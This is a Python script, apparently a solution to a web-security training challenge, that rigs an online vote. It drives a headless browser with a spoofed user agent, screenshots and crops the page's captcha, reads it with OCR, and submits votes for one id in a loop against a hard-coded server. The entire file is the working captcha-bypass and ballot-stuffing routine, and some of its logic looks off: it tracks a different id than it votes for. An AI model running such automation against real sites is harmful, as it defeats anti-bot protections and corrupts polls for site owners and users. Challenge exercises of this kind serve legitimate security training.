#!/usr/bin/python
try:
	from PIL import Image
except:
	print('\x1b[6;30;41m' + "Error to import PIL" + '\x1b[0m')
try:
	from selenium import webdriver
except:
	print('\x1b[6;30;41m' + "Error to import Selenium" + '\x1b[0m')
from selenium.webdriver.chrome.options import Options
import os
import pytesseract
import requests
from bs4 import BeautifulSoup

url = "http://158.69.76.135/level3.php"
lent = 0

"""
	Function get votes
"""
def getVotes(url, id):
    lent = 0
    listId = []
    state = requests.get(url)
    soup = BeautifulSoup(state.content, 'html.parser')
    results = soup.find_all('tr')
    for x in results:
        vote = str(x).replace("<td>", "")
        firtsLetter = vote.replace("</td>", "")
        firtsLetter = firtsLetter.replace("<tr>","")
        firtsLetter = firtsLetter.replace("</tr>","")
        firtsLetter = firtsLetter.replace("\n","")
        firtsLetter = firtsLetter.replace(" ", "\n")
        firtsLetter = firtsLetter.split()
        listId.append(firtsLetter)
    for i in listId:
        if lent > 1:
            if (int(i[0]) == id):
                return i[1]
        lent += 1
    return 0


# Get votes
votes = getVotes(url, 50000)
# Options of chrome
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0")
# Charge Driver
with webdriver.Chrome("./chromedriver", chrome_options=chrome_options) as driver:
	while (lent < 1098):
		# Set size of window
		driver.set_window_size(600, 860)
		driver.get(url)
		# Save Screenshot
		driver.save_screenshot("./img.png")
		#Clone Chrome


		# Open image
		image = Image.open(r"./img.png")
		# x1, y1, x2, y2
		img2 = image.crop((10, 710, 55, 735))
		img2.save('./img2', 'PNG')
		# Change name
		os.system("mv img2 img2.png")
		# Send image to pytessereact
		string = pytesseract.image_to_string(Image.open("./img2.png"))
		# Find element of web
		inputI = driver.find_element_by_name("id")
		inputI.send_keys('1192')
		# Find element of web
		inputC = driver.find_element_by_name("captcha")
		inputC.send_keys(string)
		# Find element of web
		bottonS = driver.find_element_by_name("holdthedoor").click()
		# Evaluate to success submit
		if (votes < getVotes(url, 50000)):
			lent += 1
			votes = getVotes(url, 50000)

print('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')